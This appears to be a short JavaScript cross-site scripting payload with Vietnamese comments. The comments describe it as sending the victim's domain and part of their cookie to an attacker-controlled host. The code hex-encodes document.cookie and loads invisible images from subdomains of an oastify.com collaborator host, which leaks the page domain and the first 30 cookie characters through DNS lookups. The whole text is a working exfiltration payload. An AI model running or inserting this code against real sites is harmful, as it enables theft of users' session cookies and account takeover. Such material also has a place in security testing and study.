//  Mã JS sẽ gửi tên domain và một phần cookie của nạn nhân về host do attacker kiểm soát (`8nw07aka35v6flou2sskxfuz6qcj08.oastify.com`)
function toHex(str) { //request DNS sẽ lowercase tất cả ký tự nên những dữ liệu có ký tự in hoa thì cần chuyển thành hex
    var result = '';
    for (var i=0; i<str.length; i++) {
      result += str.charCodeAt(i).toString(16);
    }
    return result;
}
var img = new Image();img.width = 0;img.height = 0;
img.src = '//' + document.domain + '.8nw07aka35v6flou2sskxfuz6qcj08.oastify.com'; //Gửi tên domain trang thực thi mã độc phía nạn nhân 
document.getElementsByTagName('html')[0].append(img);
var img = new Image();img.width = 0;img.height = 0;
img.src = '//' + toHex(document.cookie).substring(0,30) + '.8nw07aka35v6flou2sskxfuz6qcj08.oastify.com'; //Gửi 30 ký tự đầu trong cookie của nạn nhân
document.getElementsByTagName('html')[0].append(img);
